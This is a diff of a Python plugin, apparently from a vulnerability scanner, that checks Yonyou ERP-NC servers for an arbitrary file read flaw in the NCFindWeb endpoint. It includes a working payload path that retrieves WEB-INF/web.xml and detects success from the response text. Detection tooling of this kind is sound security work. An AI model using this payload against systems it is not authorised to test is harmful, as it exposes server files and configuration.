@@ -1,60 +1,38 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from thirdparty import requests
+yonyou_nc_fileRead_payloads = [
+    {'path': 'NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'},
+]
 
-def nc_fileRead_scan(self, url):
+def nc_fileRead_scan(self, clients):
     ''' 用友ERP-NC NCFindWeb接口任意文件读取/下载漏洞
             也可以目录遍历
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name + 'ERP-NC'
-    vul_info['vul_type'] = 'FileRead'
-    vul_info['vul_id'] = 'NC-fileRead'
-    vul_info['vul_method'] = 'GET'
-    vul_info['headers'] = {}
+    client = clients.get('reqClient')
 
-    headers = self.headers
-    headers.update(vul_info['headers'])
+    vul_info = {
+        'app_name': self.app_name + 'ERP-NC',
+        'vul_type': 'FileRead',
+        'vul_id': 'NC-fileRead',
+    }
 
-    for payload in self.yonyou_nc_fileRead_payloads:# * Payload
-        path = payload['path']                      # * Path
-        data = payload['data']                      # * Data
-        target = url + path                         # * Target
+    for payload in yonyou_nc_fileRead_payloads:
+        path = payload['path']
+        
+        res = client.request(
+            'get',
+            path,
+            vul_info=vul_info
+        )
+        if res is None:
+            continue
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['target'] = target
-
-        try:
-            res = requests.get(
-                target, 
-                timeout=self.timeout, 
-                headers=headers, 
-                data=data, 
-                proxies=self.proxies, 
-                verify=False
-            )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
-
-            if (('nc.bs.framework.server' in res.text) or ('WebApplicationStartupHook' in res.text)):
-                results = {
-                    'Target': target,
-                    'Type': [vul_info['vul_type'], vul_info['app_name'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path
-                    }
-                }
-                return results
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+        if (('nc.bs.framework.server' in res.text) or ('WebApplicationStartupHook' in res.text)):
+            results = {
+                'Target': res.request.url,
+                'Type': [vul_info['vul_type'], vul_info['app_name'], vul_info['vul_id']],
+                'Request': res,
+            }
+            return results
+    return None
